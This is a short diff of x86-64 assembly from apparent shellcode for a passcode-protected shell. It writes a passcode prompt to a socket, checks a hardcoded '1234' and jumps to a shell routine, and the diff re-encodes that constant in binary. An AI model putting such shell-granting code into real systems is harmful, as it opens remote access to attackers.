@@ -167,7 +167,7 @@ _start:
 
 	push byte 1
 	pop rax				; write syscall 
-	mov rdi, r9			; fd
+	mov rdi, r9			; sockfd		; could use fd 1
         mov rsi, rsp			; buffer
 	push byte 25			; $ echo "Enter 4 digit passcode: " | wc = 25
 	pop rdx
@@ -189,7 +189,7 @@ _start:
         syscall
         ; ********check passc0de **************************************:
         mov eax, dword [rsp]
-        cmp eax, 0x34333231             ; passcode 1234 in ASCII backwards
+	cmp eax, 0b110100001100110011001000110001
         je _shell
         ; ***************************************************************************************
         ; ***************************************************************************************
